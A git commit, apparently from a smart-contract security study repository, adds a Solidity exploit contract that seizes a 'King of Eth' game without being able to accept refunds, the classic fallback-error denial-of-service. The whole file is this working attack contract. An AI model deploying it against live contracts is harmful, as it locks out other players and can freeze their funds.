88c66f81891689ae44fc6d5525aa271b9332a713
alexursol2 <103754814+alexursol2@users.noreply.github.com>
2024-03-09 12:39:27 +0100

    Update Fallback_error.sol

--- Security/Fallback_error.sol
+++ Security/Fallback_error.sol
@@ -1,1 +1,18 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
 
+interface IKingOfEth {
+    function play() external payable;
+}
+
+contract KingOfEthExploit {
+    IKingOfEth public target;
+
+    constructor(address _target) {
+        target = IKingOfEth(_target);
+    }
+
+    function pwn() external payable {
+        target.play{value: msg.value}();
+    }
+}
